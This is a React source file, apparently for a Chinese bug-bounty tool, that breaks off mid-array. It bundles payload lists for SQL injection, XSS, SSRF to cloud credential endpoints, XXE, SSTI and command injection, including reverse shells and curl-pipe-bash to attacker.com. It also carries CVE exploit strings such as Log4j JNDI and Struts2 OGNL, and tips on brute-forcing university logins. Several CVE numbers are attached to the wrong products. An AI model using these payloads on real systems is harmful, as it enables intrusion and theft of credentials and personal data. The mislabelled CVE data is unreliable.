import React, { useState, useEffect } from 'react';
import { vulnTechniquesApi, srcApi, eduApi, activeScanApi } from '../services/api';

const POC_DATABASE = {
  sql_injection: {
    label: 'SQL注入',
    icon: '💉',
    color: 'text-red-400',
    bg: 'bg-red-600/10',
    border: 'border-red-600/30',
    payloads: [
      { name: '基础绕过', payload: "' OR '1'='1", desc: '最基础的SQL注入绕过' },
      { name: '注释绕过', payload: "' OR '1'='1'--", desc: '使用注释截断后续查询' },
      { name: 'UNION注入', payload: "' UNION SELECT NULL--", desc: '测试UNION注入点' },
      { name: 'UNION列数探测', payload: "' UNION SELECT NULL,NULL,NULL--", desc: '探测列数' },
      { name: '报错注入', payload: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", desc: 'SQL Server报错注入' },
      { name: '时间盲注', payload: "' AND SLEEP(5)--", desc: 'MySQL时间盲注' },
      { name: '布尔盲注', payload: "' AND 1=1--", desc: '布尔条件注入' },
      { name: '堆叠注入', payload: "'; DROP TABLE users--", desc: '堆叠查询注入' },
      { name: 'MySQL版本注释', payload: "' /*!50000or*/ '1'='1", desc: 'MySQL版本注释绕过WAF' },
      { name: '内联注释绕过', payload: "'/**/OR/**/1=1--", desc: '使用内联注释绕过' },
      { name: '宽字节注入', payload: "%df%27%20OR%201=1--", desc: 'GBK编码宽字节注入' },
      { name: '二次注入', payload: "admin'and(select*1 from(select 1)concat(0x7c,substring(user(),2,1))--", desc: '二次查询注入' },
      { name: 'Order By注入', payload: "1 ORDER BY 1--", desc: 'ORDER BY注入点' },
      { name: 'Limit注入', payload: "1 LIMIT 0,1 UNION SELECT 1,2,3--", desc: 'LIMIT注入' },
    ],
  },
  xss: {
    label: 'XSS跨站脚本',
    icon: '🔥',
    color: 'text-orange-400',
    bg: 'bg-orange-600/10',
    border: 'border-orange-600/30',
    payloads: [
      { name: '基础弹窗', payload: '<script>alert(1)</script>', desc: '最基础的XSS测试' },
      { name: 'IMG标签', payload: '<img src=x onerror=alert(1)>', desc: '使用IMG标签触发' },
      { name: 'SVG标签', payload: '"><svg onload=alert(1)>', desc: 'SVG标签XSS' },
      { name: 'Body标签', payload: '</title><script>alert(1)</script>', desc: '闭合title标签' },
      { name: '事件处理器', payload: '<div onmouseover="alert(1)">test</div>', desc: '鼠标悬停触发' },
      { name: 'Input标签', payload: '<input onfocus=alert(1) autofocus>', desc: '输入框自动聚焦' },
      { name: 'Details标签', payload: '<details open ontoggle=alert(1)>', desc: 'Details标签触发' },
      { name: 'Embed标签', payload: '<embed src="javascript:alert(1)">', desc: 'Embed标签XSS' },
      { name: 'Object标签', payload: '<object data="javascript:alert(1)">', desc: 'Object标签XSS' },
      { name: 'Iframe标签', payload: '<iframe src="javascript:alert(1)">', desc: 'Iframe标签XSS' },
      { name: 'SVG动画', payload: '<svg><animate onbegin=alert(1)>', desc: 'SVG动画触发' },
      { name: 'Maqetta标签', payload: '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">', desc: 'MathML XSS' },
      { name: '模板注入', payload: '{{7*7}}', desc: '模板引擎SSTI测试' },
      { name: 'Angular注入', payload: '{{constructor.constructor("alert(1)")()}}', desc: 'Angular模板注入' },
      { name: 'Vue.js注入', payload: '{{_openBlock(()=>alert(1))}}', desc: 'Vue.js模板注入' },
      { name: 'HTML实体', payload: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', desc: 'HTML实体编码绕过' },
      { name: 'Unicode绕过', payload: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', desc: 'Unicode编码绕过' },
      { name: 'Data URI', payload: '<a href="data:text/html,<script>alert(1)</script>">click</a>', desc: 'Data URI XSS' },
      { name: 'JS协议', payload: '<a href="javascript:alert(1)">click</a>', desc: 'JavaScript协议XSS' },
    ],
  },
  ssrf: {
    label: 'SSRF服务端请求伪造',
    icon: '🌐',
    color: 'text-blue-400',
    bg: 'bg-blue-600/10',
    border: 'border-blue-600/30',
    payloads: [
      { name: '本地回环', payload: 'http://127.0.0.1', desc: '测试本地回环地址' },
      { name: '本地回环2', payload: 'http://localhost', desc: 'localhost测试' },
      { name: '内网IP', payload: 'http://192.168.1.1', desc: '内网IP探测' },
      { name: 'AWS元数据', payload: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS云元数据获取' },
      { name: 'AWS IAM', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'AWS IAM凭证获取' },
      { name: 'GCE元数据', payload: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP云元数据' },
      { name: 'Azure元数据', payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', desc: 'Azure云元数据' },
      { name: '阿里云元数据', payload: 'http://100.100.100.200/latest/meta-data/', desc: '阿里云元数据' },
      { name: '本地文件', payload: 'file:///etc/passwd', desc: '读取本地文件(Linux)' },
      { name: 'Windows文件', payload: 'file:///c:/windows/win.ini', desc: '读取Windows文件' },
      { name: 'Dict协议', payload: 'dict://127.0.0.1:6379/INFO', desc: 'Redis信息泄露' },
      { name: 'Gopher协议', payload: 'gopher://127.0.0.1:6379/_INFO', desc: 'Gopher协议攻击Redis' },
      { name: 'SFTP协议', payload: 'sftp://127.0.0.1:22/', desc: 'SFTP协议测试' },
      { name: 'TFTP协议', payload: 'tftp://127.0.0.1:69/test', desc: 'TFTP协议测试' },
      { name: 'LDAP协议', payload: 'ldap://127.0.0.1:389/cn=test', desc: 'LDAP协议测试' },
      { name: 'DNS Rebinding', payload: 'http://A.127.0.0.1.1time.8.8.8.8.example.com', desc: 'DNS重绑定攻击' },
      { name: 'IPv6回环', payload: 'http://[::1]', desc: 'IPv6本地回环' },
      { name: '十进制IP', payload: 'http://2130706433/', desc: '十进制IP绕过' },
      { name: '八进制IP', payload: 'http://0177.0.0.1/', desc: '八进制IP绕过' },
      { name: '十六进制IP', payload: 'http://0x7f.0.0.1/', desc: '十六进制IP绕过' },
      { name: '短网址绕过', payload: 'http://bit.ly/xxxxx', desc: '使用短网址绕过' },
      { name: 'DNS重绑定', payload: 'http://7f000001.ip.cdn77.org/', desc: 'DNS重绑定服务' },
    ],
  },
  xxe: {
    label: 'XXE外部实体注入',
    icon: '📄',
    color: 'text-purple-400',
    bg: 'bg-purple-600/10',
    border: 'border-purple-600/30',
    payloads: [
      { name: '基础XXE', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', desc: '读取/etc/passwd' },
      { name: 'SSRF XXE', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.example.com/">]><root>&xxe;</root>', desc: 'XXE触发SSRF' },
      { name: '参数实体', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', desc: '参数实体XXE' },
      { name: 'Blind XXE', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=%file;">]><root>&xxe;</root>', desc: '盲注XXE外带数据' },
      { name: 'XXE Base64', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>', desc: 'PHP Base64编码绕过' },
      { name: 'XXE Expect', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>', desc: 'Expect协议XXE' },
      { name: 'DOCTYPE攻击', payload: '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', desc: '完整DOCTYPE攻击' },
      { name: 'XInclude攻击', payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', desc: 'XInclude攻击' },
      { name: 'SVG XXE', payload: '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>', desc: 'SVG文件XXE' },
      { name: 'XLSX XXE', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', desc: 'Excel文件XXE' },
    ],
  },
  directory_traversal: {
    label: '目录遍历/路径穿越',
    icon: '📁',
    color: 'text-yellow-400',
    bg: 'bg-yellow-600/10',
    border: 'border-yellow-600/30',
    payloads: [
      { name: '基础遍历', payload: '../../../etc/passwd', desc: 'Linux基础目录遍历' },
      { name: 'Windows遍历', payload: '..\\..\\..\\windows\\win.ini', desc: 'Windows目录遍历' },
      { name: 'URL编码', payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', desc: 'URL编码绕过' },
      { name: '双重编码', payload: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', desc: '双重URL编码' },
      { name: 'Unicode编码', payload: '..%c0%af..%c0%af..%c0%afetc/passwd', desc: 'Unicode编码绕过' },
      { name: '点号绕过', payload: '....//....//....//etc/passwd', desc: '使用多个点号绕过' },
      { name: '空字节绕过', payload: '../../../etc/passwd%00.jpg', desc: '空字节截断' },
      { name: '参数污染', payload: '....//....//....//....//etc/passwd', desc: '参数污染绕过' },
      { name: '混合斜杠', payload: '..\\..\\..\\etc/passwd', desc: '混合斜杠绕过' },
      { name: '绝对路径', payload: '/etc/passwd', desc: '直接使用绝对路径' },
      { name: 'Windows绝对路径', payload: 'c:\\windows\\system32\\config\\sam', desc: 'Windows SAM文件' },
      { name: 'Java路径', payload: 'WEB-INF/web.xml', desc: 'Java Web配置文件' },
      { name: 'PHP路径', payload: '....//....//....//etc/passwd', desc: 'PHP路径穿越' },
      { name: 'ASP路径', payload: '..\\..\\..\\boot.ini', desc: 'ASP路径穿越' },
    ],
  },
  command_injection: {
    label: '命令注入/RCE',
    icon: '⚡',
    color: 'text-red-500',
    bg: 'bg-red-600/20',
    border: 'border-red-600/40',
    payloads: [
      { name: '基础命令', payload: '; ls -la', desc: '分号命令分隔' },
      { name: '管道命令', payload: '| ls -la', desc: '管道命令执行' },
      { name: 'AND命令', payload: '&& ls -la', desc: 'AND命令执行' },
      { name: 'OR命令', payload: '|| ls -la', desc: 'OR命令执行' },
      { name: '反引号', payload: '`ls -la`', desc: '反引号命令执行' },
      { name: '$()语法', payload: '$(ls -la)', desc: '$()命令替换' },
      { name: '换行注入', payload: '\nls -la', desc: '换行符命令注入' },
      { name: 'Windows命令', payload: '& dir', desc: 'Windows命令注入' },
      { name: 'Ping注入', payload: '; ping -c 10 attacker.com', desc: 'Ping命令注入' },
      { name: 'Curl注入', payload: '; curl http://attacker.com/shell.sh | bash', desc: '下载执行脚本' },
      { name: 'Wget注入', payload: '; wget http://attacker.com/shell.sh -O /tmp/shell.sh', desc: 'Wget下载' },
      { name: 'NC反弹', payload: '; nc -e /bin/sh attacker.com 4444', desc: 'Netcat反弹Shell' },
      { name: 'Bash反弹', payload: '; bash -i >& /dev/tcp/attacker.com/4444 0>&1', desc: 'Bash反弹Shell' },
      { name: 'Python反弹', payload: '; python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);s.close()"', desc: 'Python反弹Shell' },
      { name: 'PHP反弹', payload: '; php -r \'$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'', desc: 'PHP反弹Shell' },
    ],
  },
  file_upload: {
    label: '文件上传漏洞',
    icon: '📤',
    color: 'text-pink-400',
    bg: 'bg-pink-600/10',
    border: 'border-pink-600/30',
    payloads: [
      { name: 'PHP后缀', payload: 'shell.php', desc: 'PHP可执行文件' },
      { name: 'PHP5后缀', payload: 'shell.php5', desc: 'PHP5后缀' },
      { name: 'PHTML后缀', payload: 'shell.phtml', desc: 'PHTML后缀' },
      { name: '空字节截断', payload: 'shell.php%00.jpg', desc: '空字节截断绕过' },
      { name: '双重后缀', payload: 'shell.php.jpg', desc: '双重后缀绕过' },
      { name: '大小写绕过', payload: 'shell.PhP', desc: '大小写混合绕过' },
      { name: 'htaccess', payload: '.htaccess', desc: 'Apache配置文件' },
      { name: 'ASP后缀', payload: 'shell.asp', desc: 'ASP可执行文件' },
      { name: 'ASPX后缀', payload: 'shell.aspx', desc: 'ASPX后缀' },
      { name: 'JSP后缀', payload: 'shell.jsp', desc: 'JSP可执行文件' },
      { name: 'WAR后缀', payload: 'shell.war', desc: 'WAR包上传' },
      { name: 'SVG+PHP', payload: 'shell.svg.php', desc: 'SVG包含PHP' },
      { name: '图片马', payload: 'image.php.png', desc: '图片马(文件头伪装)' },
      { name: 'Content-Type绕过', payload: 'Content-Type: image/jpeg', desc: '修改Content-Type' },
      { name: 'MIME绕过', payload: 'MIME: image/jpeg', desc: '修改MIME类型' },
    ],
  },
  ssti: {
    label: '服务端模板注入(SSTI)',
    icon: '📝',
    color: 'text-cyan-400',
    bg: 'bg-cyan-600/10',
    border: 'border-cyan-600/30',
    payloads: [
      { name: 'Jinja2测试', payload: '{{7*7}}', desc: 'Jinja2基础测试' },
      { name: 'Twig测试', payload: '{{_self.env}}', desc: 'Twig环境变量' },
      { name: 'Smarty测试', payload: '{phpinfo()}', desc: 'Smarty PHP执行' },
      { name: 'Mako测试', payload: '${7*7}', desc: 'Mako模板测试' },
      { name: 'Jinja2文件读取', payload: "{{ ''.__class__.__mro__[2].__subclasses__() }}", desc: 'Jinja2类继承' },
      { name: 'Twig文件读取', payload: "{{['id']}}", desc: 'Twig命令执行' },
      { name: 'Flask配置', payload: "{{config.items()}}", desc: 'Flask配置泄露' },
      { name: 'Django配置', payload: "{{settings.SECRET_KEY}}", desc: 'Django密钥泄露' },
      { name: 'Python执行', payload: "{{request['application']['__globals']['__builtins']['__import__']('os').popen('id').read()}}", desc: 'Python命令执行' },
      { name: 'Ruby执行', payload: '<%= system(\'id\') %>', desc: 'ERB Ruby执行' },
    ],
  },
  idor: {
    label: '越权访问(IDOR)',
    icon: '🚪',
    color: 'text-green-400',
    bg: 'bg-green-600/10',
    border: 'border-green-600/30',
    payloads: [
      { name: '用户ID遍历', payload: '/api/user/1 → /api/user/2', desc: '遍历用户ID' },
      { name: '订单ID遍历', payload: '/order/1001 → /order/1002', desc: '遍历订单ID' },
      { name: '文件ID遍历', payload: '/file?id=1 → /file?id=2', desc: '遍历文件ID' },
      { name: 'UUID遍历', payload: '/api/resource/uuid-1 → /api/resource/uuid-2', desc: '遍历UUID' },
      { name: '参数篡改', payload: 'user_id=1 → user_id=2', desc: '篡改参数值' },
      { name: 'Cookie篡改', payload: 'user_role=user → user_role=admin', desc: '篡改Cookie' },
      { name: 'Token篡改', payload: '修改JWT Token中的用户ID', desc: '篡改JWT' },
      { name: 'Referer绕过', payload: '修改Referer头绕过检查', desc: 'Referer绕过' },
      { name: '请求方法篡改', payload: 'GET → POST 绕过权限检查', desc: 'HTTP方法篡改' },
    ],
  },
  lfi: {
    label: '本地文件包含(LFI)',
    icon: '📂',
    color: 'text-indigo-400',
    bg: 'bg-indigo-600/10',
    border: 'border-indigo-600/30',
    payloads: [
      { name: 'PHP伪协议', payload: 'php://filter/convert.base64-encode/resource=/etc/passwd', desc: 'PHP filter读取文件' },
      { name: 'PHP输入流', payload: 'php://input', desc: 'PHP输入流' },
      { name: 'PHP data协议', payload: 'data://text/plain;base64,PD9waHAK', desc: 'Data协议' },
      { name: 'Expect伪协议', payload: 'expect://id', desc: 'Expect协议' },
      { name: 'ZIP包含', payload: 'phar://archive.zip/shell.php', desc: 'Phar ZIP包含' },
      { name: '日志投毒', payload: '/var/log/apache2/access.log', desc: 'Apache日志投毒' },
      { name: 'Session包含', payload: '/var/lib/php/sessions/sess_xxx', desc: 'PHP Session包含' },
      { name: 'Proc文件', payload: '/proc/self/environ', desc: 'Proc环境变量' },
      { name: 'FD包含', payload: '/proc/self/fd/0', desc: '文件描述符包含' },
    ],
  },
  rfi: {
    label: '远程文件包含(RFI)',
    icon: '🔗',
    color: 'text-rose-400',
    bg: 'bg-rose-600/10',
    border: 'border-rose-600/30',
    payloads: [
      { name: 'HTTP包含', payload: 'http://attacker.com/shell.txt', desc: 'HTTP远程包含' },
      { name: 'HTTPS包含', payload: 'https://attacker.com/shell.txt', desc: 'HTTPS远程包含' },
      { name: 'FTP包含', payload: 'ftp://attacker.com/shell.txt', desc: 'FTP远程包含' },
      { name: 'PHP伪协议RFI', payload: 'php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt', desc: 'PHP filter RFI' },
    ],
  },
  open_redirect: {
    label: '开放重定向',
    icon: '↪️',
    color: 'text-amber-400',
    bg: 'bg-amber-600/10',
    border: 'border-amber-600/30',
    payloads: [
      { name: 'URL参数', payload: '?url=http://attacker.com', desc: 'URL参数重定向' },
      { name: '相对路径', payload: '?url=//attacker.com', desc: '协议相对URL' },
      { name: '参数污染', payload: '?url=http://attacker.com%0agoogle.com', desc: '参数污染绕过' },
      { name: 'IP格式绕过', payload: '?url=http://2130706433', desc: '十进制IP绕过' },
      { name: 'JavaScript协议', payload: '?url=javascript:alert(1)', desc: 'JS协议XSS' },
      { name: 'Data协议', payload: '?url=data:text/html,<script>alert(1)</script>', desc: 'Data协议XSS' },
    ],
  },
  cors: {
    label: 'CORS跨域配置错误',
    icon: '🌐',
    color: 'text-teal-400',
    bg: 'bg-teal-600/10',
    border: 'border-teal-600/30',
    payloads: [
      { name: 'Origin反射', payload: 'Origin: http://attacker.com', desc: '测试Origin反射' },
      { name: 'null源', payload: 'Origin: null', desc: 'null源测试' },
      { name: '通配符', payload: 'Access-Control-Allow-Origin: *', desc: '检测通配符CORS' },
      { name: '正则绕过', payload: 'Origin: http://attacker.comtarget.com', desc: '正则匹配绕过' },
    ],
  },
  websocket: {
    label: 'WebSocket安全',
    icon: '🔌',
    color: 'text-violet-400',
    bg: 'bg-violet-600/10',
    border: 'border-violet-600/30',
    payloads: [
      { name: 'CSWSH攻击', payload: 'ws://target.com/ws', desc: '跨站WebSocket劫持' },
      { name: '协议混淆', payload: 'wss://target.com/ws (HTTP Origin)', desc: '协议混淆绕过' },
    ],
  },
  deserialization: {
    label: '反序列化漏洞',
    icon: '📦',
    color: 'text-fuchsia-400',
    bg: 'bg-fuchsia-600/10',
    border: 'border-fuchsia-600/30',
    payloads: [
      { name: 'Java序列化', payload: 'rO0ABXQAC2VzABJMgA', desc: 'Java序列化魔术头' },
      { name: 'PHP序列化', payload: 'O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}', desc: 'PHP序列化注入' },
      { name: 'Python Pickle', payload: 'cposix\nsystem\np1\n(S\'id\'\np2\n.', desc: 'Python Pickle RCE' },
      { name: 'YAML反序列化', payload: '!!python/object/apply:os.system ["id"]', desc: 'YAML RCE' },
    ],
  },
  jwt: {
    label: 'JWT安全',
    icon: '🎫',
    color: 'text-lime-400',
    bg: 'bg-lime-600/10',
    border: 'border-lime-600/30',
    payloads: [
      { name: 'None算法', payload: '{"alg":"none","typ":"JWT"}', desc: 'None算法绕过' },
      { name: '弱密钥', payload: '尝试爆破弱密钥: secret, 123456, password', desc: '弱密钥爆破' },
      { name: '算法混淆', payload: 'HS256 → RS256 算法混淆', desc: '算法混淆攻击' },
      { name: 'Kid注入', payload: '{"kid":"../../path/to/file"}', desc: 'Kid路径注入' },
    ],
  },
  graphql: {
    label: 'GraphQL安全',
    icon: '📊',
    color: 'text-pink-400',
    bg: 'bg-pink-600/10',
    border: 'border-pink-600/30',
    payloads: [
      { name: 'Introspection', payload: '{__schema{types{name}}}', desc: 'GraphQL内省查询' },
      { name: '批量查询', payload: '批量执行多个查询', desc: '批量查询攻击' },
      { name: '字段建议', payload: '{__type(name:"User"){fields{name}}}', desc: '字段建议查询' },
      { name: 'DoS攻击', payload: '深度嵌套查询导致DoS', desc: '深度嵌套DoS' },
    ],
  },
  nosql: {
    label: 'NoSQL注入',
    icon: '🗃️',
    color: 'text-emerald-400',
    bg: 'bg-emerald-600/10',
    border: 'border-emerald-600/30',
    payloads: [
      { name: 'MongoDB基础', payload: '{"$gt":""}', desc: 'MongoDB $gt操作符' },
      { name: 'MongoDB OR', payload: '{"$or":[{"user":"admin"},{"user":"root"}]}', desc: 'MongoDB $or操作符' },
      { name: 'MongoDB Where', payload: '{"$where":"this.password == this.password"}', desc: 'MongoDB $where注入' },
      { name: 'MongoDB Regex', payload: '{"$regex":".*"}', desc: 'MongoDB正则注入' },
    ],
  },
  ldap: {
    label: 'LDAP注入',
    icon: '📇',
    color: 'text-sky-400',
    bg: 'bg-sky-600/10',
    border: 'border-sky-600/30',
    payloads: [
      { name: '通配符', payload: '*)(&', desc: 'LDAP通配符注入' },
      { name: 'OR注入', payload: '(|(user=*)(password=*))', desc: 'LDAP OR注入' },
      { name: 'AND绕过', payload: '(&(user=*)(password=*))', desc: 'LDAP AND注入' },
      { name: 'NULL注入', payload: ')(cn=*))(|(cn=', desc: 'LDAP NULL注入' },
    ],
  },
};

const CVE_POC_DATABASE = [
  { id: 'CVE-2024-1086', name: 'Linux内核本地提权', severity: 'critical', desc: 'Linux内核netfilter UAF漏洞，允许本地用户提权', poc: 'unshare -r bash\nip link set lo up\nip link set lo down\nip link set lo up', affected: 'Linux kernel 5.14-6.6' },
  { id: 'CVE-2023-4447', name: 'HTTP/2快速重置攻击', severity: 'high', desc: 'HTTP/2协议DoS攻击，导致资源耗尽', poc: '发送大量HTTP/2 RST_STREAM帧', affected: 'HTTP/2服务' },
  { id: 'CVE-2023-38533', name: 'Python PIL命令注入', severity: 'critical', desc: 'PIL处理图片时命令注入', poc: 'from PIL import Image\nImage.open("test.jpg|touch test.png")', affected: 'Pillow < 9.5.0' },
  { id: 'CVE-2023-29357', name: 'OAuth2.0开放重定向', severity: 'high', desc: 'OAuth2.0实现中的开放重定向漏洞', poc: '修改redirect_uri参数指向恶意站点', affected: 'OAuth2.0实现' },
  { id: 'CVE-2022-35929', name: 'libcurl信息泄露', severity: 'medium', desc: 'libcurl使用相同连接池导致Cookie泄露', poc: '复用连接导致Cookie跨域泄露', affected: 'libcurl < 7.85.0' },
  { id: 'CVE-2021-44228', name: 'Apache Log4j RCE', severity: 'critical', desc: 'Log4j JNDI注入远程代码执行', poc: '${jndi:ldap://attacker.com:1389/Exploit}', affected: 'Log4j 2.0-beta9 ~ 2.14.1' },
  { id: 'CVE-2021-26084', name: 'Confluence OGNL注入', severity: 'critical', desc: 'Confluence OGNL表达式注入', poc: '/%24%7B%5B%5D%20test%20test%5D%7D/', affected: 'Confluence < 7.4.14' },
  { id: 'CVE-2021-31207', name: 'Exchange SSRF', severity: 'high', desc: 'Microsoft Exchange Server SSRF', poc: '通过Exchange API触发SSRF', affected: 'Exchange Server < 15.0.0' },
  { id: 'CVE-2020-3452', name: 'WordPress RCE', severity: 'critical', desc: 'WordPress文件上传导致RCE', poc: '上传包含PHP代码的图片文件', affected: 'WordPress < 5.5' },
  { id: 'CVE-2019-5736', name: 'vCenter RCE', severity: 'critical', desc: 'VMware vCenter JNDI注入RCE', poc: '通过JNDI注入触发RCE', affected: 'vCenter 6.5-7.0' },
  { id: 'CVE-2019-0193', name: 'ThinkPHP RCE', severity: 'critical', desc: 'ThinkPHP 5.x 远程代码执行', poc: "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1", affected: 'ThinkPHP 5.0-5.1.31' },
  { id: 'CVE-2018-2894', name: 'Drupal Geddon2', severity: 'critical', desc: 'Drupal远程代码执行', poc: "Drupalgeddon2 RCE exploit", affected: 'Drupal < 7.58' },
  { id: 'CVE-2017-5638', name: 'Struts2 RCE', severity: 'critical', desc: 'Apache Struts2 Jakarta Multipart RCE', poc: 'Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#dm):(#sl=#cmd).(#p=new java.lang.ProcessBuilder(#cmd)).(#p.redirectErrorStream(true)).(#p.start())}', affected: 'Struts2 2.3.5-2.3.31' },
  { id: 'CVE-2017-12627', name: 'Neo4j RCE', severity: 'critical', desc: 'Neo4j Shell Server RCE', poc: '利用Shell Server执行任意代码', affected: 'Neo4j < 3.0.6' },
  { id: 'CVE-2017-9805', name: 'OpenCart RCE', severity: 'high', desc: 'OpenCart远程代码执行', poc: '通过API接口执行任意PHP代码', affected: 'OpenCart < 3.0.2.0' },
  { id: 'CVE-2017-7269', name: 'Roundcube RCE', severity: 'critical', desc: 'Roundcube Webmail RCE', poc: '通过email参数注入执行代码', affected: 'Roundcube < 1.3.4' },
  { id: 'CVE-2016-10033', name: 'ImageMagick RCE', severity: 'critical', desc: 'ImageMagick命令注入', poc: 'push graphic-context\nviewbox 0 0 640 480\nfill "url(https://example.com/image.jpg|rm -rf /tmp/target)" pop graphic-context', affected: 'ImageMagick < 7.0.1-1' },
];

const SRC_PLATFORMS = [
  { name: '阿里云先知', url: 'https://xianzhi.aliyun.com', scope: '阿里系产品', reward: '数千至数十万', level: '⭐⭐⭐⭐⭐' },
  { name: '腾讯TSRC', url: 'https://security.tencent.com', scope: '腾讯系产品', reward: '数千至数十万', level: '⭐⭐⭐⭐⭐' },
  { name: '百度BSRC', url: 'https://bsrc.baidu.com', scope: '百度系产品', reward: '数千至数十万', level: '⭐⭐⭐⭐⭐' },
  { name: '字节跳动SRC', url: 'https://security.bytedance.com', scope: '字节系产品', reward: '数千至数十万', level: '⭐⭐⭐⭐⭐' },
  { name: '美团MSRC', url: 'https://security.meituan.com', scope: '美团系产品', reward: '数千至数十万', level: '⭐⭐⭐⭐' },
  { name: '京东JSRC', url: 'https://security.jd.com', scope: '京东系产品', reward: '数千至数十万', level: '⭐⭐⭐⭐' },
  { name: '小米SRC', url: 'https://sec.mi.com', scope: '小米系产品', reward: '数千至数十万', level: '⭐⭐⭐⭐' },
  { name: '华为PSIRT', url: 'https://psirt.huawei.com', scope: '华为产品', reward: '数千至数十万', level: '⭐⭐⭐⭐⭐' },
  { name: '360漏洞云', url: 'https://loudong.360.cn', scope: '360产品', reward: '数千至数十万', level: '⭐⭐⭐⭐' },
  { name: '奇安信SRC', url: 'https://src.qianxin.com', scope: '奇安信产品', reward: '按严重程度', level: '⭐⭐⭐⭐' },
  { name: '漏洞盒子', url: 'https://www.vulbox.com', scope: '众测项目', reward: '按严重程度', level: '⭐⭐⭐⭐' },
  { name: '补天平台', url: 'https://www.butian.net', scope: '政企项目', reward: '按等级', level: '⭐⭐⭐⭐' },
  { name: '教育网SRC联盟', url: 'https://src.edu-cn.net', scope: '*.edu.cn', reward: '荣誉+礼品', level: '⭐⭐⭐' },
  { name: 'CNVD', url: 'https://www.cnvd.org.cn', scope: '通用漏洞', reward: '证书+积分', level: '⭐⭐⭐⭐' },
  { name: 'CNNVD', url: 'https://www.cnnvd.org.cn', scope: '国家漏洞库', reward: '证书', level: '⭐⭐⭐⭐' },
  { name: 'HackerOne', url: 'https://hackerone.com', scope: '国际众测', reward: '美元结算', level: '⭐⭐⭐⭐⭐' },
  { name: 'Bugcrowd', url: 'https://bugcrowd.com', scope: '国际众测', reward: '美元结算', level: '⭐⭐⭐⭐⭐' },
];

const EDU_TIPS = [
  { title: '信息收集是关键', content: '教育网目标通常有大量子域名，使用子域名爆破、证书透明度、搜索引擎语法收集资产。重点关注：OA系统、邮件系统、VPN、图书馆系统、一卡通系统。常用工具：subfinder, ksubdomain, oneforall.', icon: '🔍', tag: 'recon' },
  { title: '弱口令高频出现', content: '教育网弱口令问题普遍存在，常见组合：学号+生日、123456、学校名缩写、admin/admin888。重点测试：VPN、WiFi认证、邮箱、OA后台、FTP。使用Hydra、Medusa等工具进行爆破.', icon: '🔑', tag: 'auth' },
  { title: '关注老旧系统', content: '高校信息化建设周期长，大量老旧系统未及时更新.重点: ASP/ASPX老系统、Struts2、WebLogic、Tomcat低版本、PHP老框架.这些系统往往存在已知CVE漏洞.', icon: '🦕', tag: 'legacy' },
  { title: '逻辑漏洞挖掘', content: '教务系统、选课系统、成绩查询、缴费系统常存在越权、订单篡改、并发竞争等逻辑漏洞.测试时多关注业务流程中的状态变更，尝试修改参数、绕过校验.', icon: '🧠', tag: 'logic' },
  { title: 'SSRF打内网', content: '高校内网资产丰富，SSRF可探测内网服务: Redis未授权、FastCGI、Zabbix、数据库服务等.结合信息收集到的内网段进行探测，使用dict://、gopher://等协议.', icon: '🌐', tag: 'ssrf' },
  { title: '文件上传绕过', content: '作业提交、头像上传、附件上传等功能点常见.尝试: 后缀名绕过(.phtml/.php5)、MIME类型伪造、00截断、.htaccess解析、图片马.上传后访问验证是否可执行.', icon: '📤', tag: 'upload' },
  { title: 'SQL注入测试', content: '搜索框、登录框、API接口都是注入点.教育网站很多使用Access/MySQL，报错注入、布尔盲注、时间盲注都适用.注意WAF绕过: 编码、注释、内联注释、大小写混合.', icon: '💉', tag: 'sqli' },
  { title: 'XSS挖掘技巧', content: '教育网站XSS过滤通常较弱.测试反射型、存储型、DOM型XSS.关注: 搜索结果、用户资料、评论、留言板、错误消息显示.使用多种编码绕过过滤.', icon: '🔥', tag: 'xss' },
  { title: '报告撰写技巧', content: 'SRC报告要清晰: 漏洞类型、危害说明、复现步骤(截图+请求包)、修复建议.附上POC和参考链接.标题简洁明了，影响范围写清楚.提供完整的复现视频或截图会增加可信度.', icon: '📝', tag: 'report' },
  { title: '敏感信息收集', content: '教育网站常泄露: 学生信息、教师信息、考试题目、成绩数据.使用Google Hack: site:*.edu.cn intitle:登录, 查找暴露的后台、数据库配置文件.', icon: '📊', tag: 'info' },
